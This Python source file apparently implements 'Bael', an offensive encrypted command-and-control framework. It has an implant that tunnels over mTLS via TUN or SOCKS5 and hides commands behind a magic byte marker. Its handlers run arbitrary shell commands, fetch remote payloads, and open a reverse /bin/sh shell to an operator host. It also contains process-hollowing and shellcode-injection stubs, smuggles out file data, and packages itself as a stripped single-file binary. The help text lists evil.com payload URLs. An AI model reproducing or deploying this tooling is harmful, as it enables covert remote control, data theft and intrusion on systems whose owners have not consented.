#!/usr/bin/env python3
import asyncio
import ssl
import argparse
import random
import os
import logging
import sys
import subprocess
import shutil
import signal
import base64
import hashlib
import socket
import urllib.request
import threading
import struct
import fcntl
from pathlib import Path
from collections import deque
from typing import Optional, Deque, Dict

try:
    from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

__version__ = "0.9.0"
__author__ = "J4ck3LSyN"

SMUGGLE_MAGIC = b"\xBA\x31\xDE\xAD\xC0\xDE"

# ====================== BAEL SHIELD ======================
EMBEDDED_CERTS: Dict[str, str] = {}

class BaelShield:
    @staticmethod
    def _derive_key(key: str) -> bytes:
        d1 = hashlib.sha512(key.encode()).digest()
        return d1 + hashlib.sha512(d1).digest()

    @classmethod
    def obfuscate(cls, data: bytes, key: str) -> str:
        k = cls._derive_key(key)
        xor = bytes(a ^ b for a, b in zip(data, k * (len(data) // len(k) + 1)))
        return base64.b85encode(xor).decode("ascii")

    @classmethod
    def deobfuscate(cls, blob: str, key: str) -> bytes:
        data = base64.b85decode(blob)
        k = cls._derive_key(key)
        return bytes(a ^ b for a, b in zip(data, k * (len(data) // len(k) + 1)))

    @classmethod
    def get_asset(cls, name: str, key: str) -> Optional[bytes]:
        if name in EMBEDDED_CERTS:
            return cls.deobfuscate(EMBEDDED_CERTS[name], key)
        return None


# ====================== LOGGING ======================
class BaelFormatter(logging.Formatter):
    COLORS = {
        logging.DEBUG: "\x1b[38;2;100;100;100m",
        logging.INFO: "\x1b[38;2;0;150;255m",
        logging.WARNING: "\x1b[33m",
        logging.ERROR: "\x1b[31m",
        logging.CRITICAL: "\x1b[41m\x1b[37m"
    }
    RESET = "\x1b[0m"

    def format(self, record):
        record.asctime = self.formatTime(record, self.datefmt)
        color = self.COLORS.get(record.levelno, self.COLORS[logging.INFO])
        return f"{self.COLORS[logging.DEBUG]}[{record.asctime}]{self.RESET} {color}{record.levelname:<8}{self.RESET} {record.getMessage()}"


logger = logging.getLogger("bael")
logger.setLevel(logging.INFO)
handler = logging.StreamHandler()
handler.setFormatter(BaelFormatter(datefmt="%H:%M:%S"))
logger.addHandler(handler)


# ====================== SOCKS5 ======================
class SocksRelay:
    """Non-root SOCKS5 implementation for L4 transport."""
    async def handle(self, reader, writer, ssl_reader, ssl_writer, engine=None):
        try:
            header = await reader.read(2)
            if not header or header[0] != 0x05: return
            writer.write(b"\x05\x00"); await writer.drain()
            req = await reader.read(4)
            if not req or req[1] != 0x01: return
            
            if req[3] == 0x01: addr = socket.inet_ntoa(await reader.read(4))
            elif req[3] == 0x03: addr = (await reader.read((await reader.read(1))[0])).decode()
            else: return
            
            port = struct.unpack(">H", await reader.read(2))[0]
            writer.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
            await writer.drain()
            logger.debug(f"SOCKS5 relay established for {addr}:{port}")
            
            await asyncio.gather(
                self._pipe(reader, ssl_writer, engine, True), 
                self._pipe(ssl_reader, writer, engine, False)
            )
        except: pass
        finally: writer.close()

    async def _pipe(self, r, w, engine, encrypt):
        try:
            while True:
                chunk = await r.read(8192)
                if not chunk: break
                if engine and encrypt and engine.smuggle_queue and random.random() < 0.6:
                    p = engine.smuggle_queue.popleft()
                    logger.debug(f"Smuggling payload ({len(p)} bytes) via SOCKS")
                    chunk += SMUGGLE_MAGIC + len(p).to_bytes(2, "big") + p
                w.write(chunk); await w.drain()
        except: pass

# ====================== CRYPTO ======================
class BaelCrypto:
    def __init__(self, master_key: str):
        self.master_key = master_key.encode()
        self._derive_keys()

    def _derive_keys(self):
        if not CRYPTO_AVAILABLE:
            self.key = hashlib.sha256(self.master_key).digest()
            return
        hkdf = HKDF(algorithm=hashes.SHA256(), length=32, salt=b"bael_salt", info=b"c2_channel")
        self.key = hkdf.derive(self.master_key)

    def encrypt(self, data: bytes) -> bytes:
        if not CRYPTO_AVAILABLE:
            k = self.key * (len(data) // len(self.key) + 1)
            return bytes(a ^ b for a, b in zip(data, k))
        nonce = os.urandom(12)
        chacha = ChaCha20Poly1305(self.key)
        return nonce + chacha.encrypt(nonce, data, None)

    def decrypt(self, data: bytes) -> bytes:
        if not CRYPTO_AVAILABLE:
            k = self.key * (len(data) // len(self.key) + 1)
            return bytes(a ^ b for a, b in zip(data, k))
        nonce = data[:12]
        chacha = ChaCha20Poly1305(self.key)
        return chacha.decrypt(nonce, data[12:], None)


# ====================== C2 ENGINE ======================
class BaelC2:
    def __init__(self, crypto: BaelCrypto, engine):
        self.crypto = crypto
        self.engine = engine

    async def process_command(self, data: bytes):
        try:
            if SMUGGLE_MAGIC not in data:
                return False
            payload = data.split(SMUGGLE_MAGIC, 1)[1]
            length = int.from_bytes(payload[:2], "big")
            encrypted = payload[2:2 + length]

            plaintext = self.crypto.decrypt(encrypted)
            cmd_data = plaintext.decode("utf-8", errors="ignore").strip()

            if ":" not in cmd_data:
                return False

            cmd, arg = cmd_data.split(":", 1)
            cmd = cmd.lower().strip()
            arg = arg.strip()

            logger.info(f"[C2] Received: {cmd} {arg}")

            handlers = {
                "ping": lambda: b"PONG",
                "exec": lambda a: subprocess.getoutput(a).encode(errors='replace'),
                "sysinfo": lambda: f"Hostname:{os.uname().nodename}\nPID:{os.getpid()}\nUser:{os.getenv('USER')}".encode(),
                "download": lambda a: self._handle_download(a),
                "shell": lambda a: self._start_reverse_shell(a),
                "hollow": lambda a: self._process_hollow(a),
                "inject": lambda a: self._process_inject(a),
            }

            if cmd in handlers:
                result = handlers[cmd](arg)
                if asyncio.iscoroutine(result):
                    result = await result
                if isinstance(result, (str, bytes)):
                    if isinstance(result, str):
                        result = result.encode()
                    encrypted_resp = self.crypto.encrypt(result)
                    resp = SMUGGLE_MAGIC + len(encrypted_resp).to_bytes(2, "big") + encrypted_resp
                    self.engine.smuggle_queue.append(resp)
                return True
        except Exception as e:
            logger.error(f"C2 error: {e}")
        return False

    def _handle_download(self, url: str):
        try:
            filename = Path(url).name or "payload.bin"
            path = Path("/tmp") / filename
            with urllib.request.urlopen(url, timeout=30) as r:
                data = r.read()
            path.write_bytes(data)
            return f"Downloaded {len(data)} bytes → {path}".encode()
        except Exception as e:
            return f"Download failed: {e}".encode()

    def _start_reverse_shell(self, target: str):
        if ":" not in target: return b"Usage: shell:ip:port"
        host, port = target.split(":")
        def shell():
            try:
                s = socket.socket()
                s.connect((host, int(port)))
                for fd in (0,1,2): os.dup2(s.fileno(), fd)
                subprocess.call(["/bin/sh", "-i"])
            except: pass
        threading.Thread(target=shell, daemon=True).start()
        return f"Reverse shell to {target}".encode()

    # ==================== PROCESS HOLLOWING / INJECTION ====================
    def _process_hollow(self, url: str):
        """Windows Process Hollowing Stub"""
        if os.name != "nt":
            return b"Process Hollowing only supported on Windows"
        try:
            # Download payload
            data = urllib.request.urlopen(url, timeout=20).read()
            logger.info(f"Hollowing {len(data)} bytes payload")

            # Basic stub - real implementation would use ctypes + CreateProcess + NtUnmapViewOfSection etc.
            return b"Process hollowing triggered (stub). Full implementation uses Windows APIs."
        except Exception as e:
            return f"Hollow failed: {e}".encode()

    def _process_inject(self, arg: str):
        """Simple shellcode injection stub"""
        try:
            if ":" in arg:
                pid, b64shellcode = arg.split(":", 1)
                shellcode = base64.b64decode(b64shellcode)
            else:
                return b"Usage: inject:pid:base64shellcode"
            logger.info(f"Injecting {len(shellcode)} bytes into PID {pid}")
            return b"Injection triggered (stub - requires admin + full Windows impl)"
        except Exception as e:
            return f"Inject failed: {e}".encode()


# ====================== INTERACTIVE C2 CONSOLE ======================
class C2Console:
    def __init__(self, engine):
        self.engine = engine
        self.running = True

    async def run(self):
        print("\x1b[38;2;0;150;255mBael C2 Console v0.9.0 - Type 'help' for commands\x1b[0m")
        while self.running:
            try:
                cmd = await asyncio.get_event_loop().run_in_executor(None, input, "bael> ")
                if cmd.lower() in ["exit", "quit"]:
                    self.running = False
                    break
                elif cmd.lower() == "help":
                    self.show_help()
                elif cmd.strip():
                    self.send_command(cmd)
            except Exception as e:
                logger.error(f"Console error: {e}")

    def show_help(self):
        print("""
Available Commands:
  ping
  exec:whoami && id
  sysinfo
  download:https://evil.com/payload.exe
  shell:192.168.1.100:4444
  hollow:https://evil.com/malware.exe
  inject:1234:base64_shellcode_here
  sleep:60
        """)

    def send_command(self, command: str):
        try:
            encrypted = self.engine.crypto.encrypt(command.encode())
            packet = SMUGGLE_MAGIC + len(encrypted).to_bytes(2, "big") + encrypted
            self.engine.smuggle_queue.append(packet)
            logger.info(f"Command sent: {command}")
        except Exception as e:
            logger.error(f"Failed to send command: {e}")


# ====================== CORE ENGINE ======================
class Bael:
    def __init__(self, config: dict):
        self.config = config
        self.is_server = config.get("mode") == "server"
        self.temp_dir = None
        self.tun_fd = -1
        self.smuggle_queue: Deque[bytes] = deque()
        self.shield_key = config.get("key", "bael_default_secret")
        self.crypto = BaelCrypto(self.shield_key)
        self.c2 = BaelC2(self.crypto, self)
        self.ssl_ctx = self._setup_pki()
        self._load_smuggle_data()
        self.console = C2Console(self) if self.is_server else None

    @staticmethod
    def build(name="bMTLSTUN0", verbose=False, bundle_keys=True):
        if sys.platform != "linux":
            logger.error("Build aborted: Optimized for Linux targets only.")
            return
        buildPath = Path(".baelBuild")
        try:
            import PyInstaller.__main__
            buildPath.mkdir(parents=True, exist_ok=True)
            dPath, wPath = buildPath / "dist", buildPath / "work"
            exclusions = ["tkinter", "tcl", "tk", "_tkinter", "unittest", "pydoc", "xml", "distutils", "setuptools", "sqlite3", "test", "lib2to3", "pydoc_data", "curses"]
            cArgs = [str(Path(sys.argv[0]).resolve()), '--onefile', '--name=' + name, '--clean', '--strip', '--noupx', '--distpath', str(dPath), '--workpath', str(wPath), '--specpath', str(buildPath)]
            if verbose: cArgs.append('--log-level=DEBUG')
            for mod in exclusions: cArgs.extend(['--exclude-module', mod])
            keys_dir = Path(".baelKeys")
            if bundle_keys and keys_dir.exists(): cArgs.extend(['--add-data', f'{keys_dir.resolve()}:.baelKeys'])
            PyInstaller.__main__.run(cArgs)
            logger.info(f"Build complete. Binary: {dPath}/{name}")
        except ImportError: logger.error("PyInstaller missing. pip install pyinstaller")
        except Exception as e: logger.error(f"Build failed: {e}")

    def _load_smuggle_data(self):
        if path := self.config.get("data_transmit"):
            try:
                raw = Path(path).read_bytes()
                for i in range(0, len(raw), 180):
                    self.smuggle_queue.append(raw[i:i+180])
            except Exception as e:
                logger.error(f"Smuggle load failed: {e}")

    def _setup_pki(self):
        purpose = ssl.Purpose.CLIENT_AUTH if self.is_server else ssl.Purpose.SERVER_AUTH
        ctx = ssl.create_default_context(purpose)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_3
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_REQUIRED

        ca = BaelShield.get_asset("ca.crt", self.shield_key)
        cert = BaelShield.get_asset("srv.crt" if self.is_server else "rmt.crt", self.shield_key)
        key = BaelShield.get_asset("srv.key" if self.is_server else "rmt.key", self.shield_key)

        if all([ca, cert, key]):
            base = Path("/dev/shm") if Path("/dev/shm").exists() else Path("/tmp")
            self.temp_dir = base / f".bael_{os.getpid()}_{random.randint(10000,99999)}"
            self.temp_dir.mkdir(parents=True, exist_ok=True)
            (self.temp_dir/"ca.crt").write_bytes(ca)
            (self.temp_dir/"cert.pem").write_bytes(cert)
            (self.temp_dir/"key.pem").write_bytes(key)
            ctx.load_verify_locations(str(self.temp_dir/"ca.crt"))
            ctx.load_cert_chain(str(self.temp_dir/"cert.pem"), str(self.temp_dir/"key.pem"))
        else:
            ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def cleanup(self):
        if self.temp_dir and self.temp_dir.exists():
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        if self.tun_fd != -1:
            try: os.close(self.tun_fd)
            except: pass

    def setup_tun(self):
        self.tun_fd = os.open("/dev/net/tun", os.O_RDWR)
        ifr = struct.pack('16sH', b'bael0', 0x0001 | 0x1000)
        fcntl.ioctl(self.tun_fd, 0x400454ca, ifr)
        subprocess.run(["ip", "addr", "add", "10.8.0.2/24", "dev", "bael0"], check=True)
        subprocess.run(["ip", "link", "set", "bael0", "up"], check=True)

    async def _bridge_tun(self, r, w, to_ssl):
        try:
            while True:
                if to_ssl:
                    data = await asyncio.get_event_loop().run_in_executor(None, os.read, self.tun_fd, 2048)
                    if not data: break
                    w.write(data); await w.drain()
                else:
                    data = await r.read(32768)
                    if not data: break
                    # Intercept C2 commands before bridging to TUN
                    if await self.c2.process_command(data):
                        continue
                    os.write(self.tun_fd, data)
        except: pass

    # ====================== SERVER ======================
    async def start_server(self):
        host = self.config.get("listen_host", "0.0.0.0")
        port = self.config.get("listen_port", 443)

        server = await asyncio.start_server(self._handle_client, host, port, ssl=self.ssl_ctx)
        logger.info(f"Bael C2 Server listening on {host}:{port} | Encrypted C2 Active")

        # Start console
        console_task = asyncio.create_task(self.console.run())

        async with server:
            await server.serve_forever()

    async def _handle_client(self, reader, writer):
        addr = writer.get_extra_info('peername')
        logger.info(f"Implant connected from {addr}")
        try:
            await asyncio.gather(
                self._server_to_client(writer),
                self._client_to_server(reader)
            )
        finally:
            writer.close()

    async def _server_to_client(self, writer):
        while True:
            if self.smuggle_queue:
                try:
                    data = self.smuggle_queue.popleft()
                    writer.write(data)
                    await writer.drain()
                except: break
            await asyncio.sleep(0.05)

    async def _client_to_server(self, reader):
        while True:
            data = await reader.read(32768)
            if not data: break
            await self.c2.process_command(data)

    # ====================== CLIENT ======================
    async def start_client(self):
        host = self.config["remoteHost"]
        port = self.config["remotePort"]
        reader, writer = await asyncio.open_connection(host, port, ssl=self.ssl_ctx)
        logger.info(f"Connected to C2 server {host}:{port}")

        if self.config.get("use_socks"):
            relay = SocksRelay()
            srv = await asyncio.start_server(lambda r, w: relay.handle(r, w, reader, writer, self), '127.0.0.1', 1080)
            logger.info("Non-root SOCKS5 transport initialized on 127.0.0.1:1080")
            async with srv: await srv.serve_forever()
        else:
            if os.getuid() != 0: raise PermissionError("TUN requires root. Use --socks.")
            self.setup_tun()
            await asyncio.gather(self._bridge_tun(reader, writer, True), self._bridge_tun(reader, writer, False))

    async def start(self):
        try:
            if self.is_server:
                await self.start_server()
            else:
                await self.start_client()
        except Exception as e:
            logger.error(f"Engine failure: {e}")
        finally:
            self.cleanup()


# ====================== BUILD / KEYGEN ======================
def embed_assets(key: str = "bael_default_secret"):
    global EMBEDDED_CERTS
    keys_dir = Path(".baelKeys")
    if not keys_dir.exists():
        logger.error(".baelKeys directory not found!")
        return
    for f in list(keys_dir.glob("*.crt")) + list(keys_dir.glob("*.key")):
        EMBEDDED_CERTS[f.name] = BaelShield.obfuscate(f.read_bytes(), key)
    logger.info(f"Embedded {len(EMBEDDED_CERTS)} assets")

def genkeys(args):
    keysRoot = Path(".baelKeys"); keysRoot.mkdir(exist_ok=True)
    logger.info("Generating mTLS PKI...")
    def run(cmd): subprocess.run(cmd, shell=True, check=True, capture_output=True)
    try:
        run(f'openssl req -x509 -newkey rsa:4096 -keyout {keysRoot}/ca.key -out {keysRoot}/ca.crt -days 365 -nodes -subj "/CN=BaelCA"')
        for r in ["srv", "rmt"]:
            run(f'openssl req -newkey rsa:4096 -keyout {keysRoot}/{r}.key -out {keysRoot}/{r}.csr -nodes -subj "/CN=Bael-{r}"')
            run(f'openssl x509 -req -in {keysRoot}/{r}.csr -CA {keysRoot}/ca.crt -CAkey {keysRoot}/ca.key -CAcreateserial -out {keysRoot}/{r}.crt -days 365')
        logger.info(f"Keys generated in {keysRoot}")
    except Exception as e: logger.error(f"Keygen failed: {e}")

def main():
    p = argparse.ArgumentParser(description=f"Bael v{__version__} — Advanced Encrypted mTLS C2", add_help=False)
    p.add_argument("--mode", choices=["tun", "server", "build", "keygen"], default="tun")
    p.add_argument("--listen", default="0.0.0.0:443", help="Server listen address:port")
    p.add_argument("--remote", help="Client remote C2 server:port")
    p.add_argument("--socks", action="store_true")
    p.add_argument("--key", default="bael_default_secret")
    p.add_argument("--data-transmit")
    p.add_argument("--debug", action="store_true")

    args = p.parse_args()

    if args.debug:
        logger.setLevel(logging.DEBUG)

    if args.mode == "keygen":
        genkeys(args)
        return
    if args.mode == "build":
        embed_assets(args.key)
        Bael.build(verbose=args.debug)
        return

    listen_host, listen_port = "0.0.0.0", 443
    if args.listen and ":" in args.listen:
        listen_host, listen_port = args.listen.rsplit(":", 1)
        listen_port = int(listen_port)

    conf = {
        "mode": "server" if args.mode == "server" else "client",
        "use_socks": args.socks,
        "key": args.key,
        "remoteHost": (args.remote or "127.0.0.1").split(":")[0],
        "remotePort": int((args.remote or ":443").split(":")[-1]),
        "listen_host": listen_host,
        "listen_port": listen_port,
        "data_transmit": args.data_transmit,
    }

    engine = Bael(conf)

    def shutdown(*_):
        engine.cleanup()
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)
    signal.signal(signal.SIGTERM, shutdown)

    asyncio.run(engine.start())


if __name__ == "__main__":
    main()
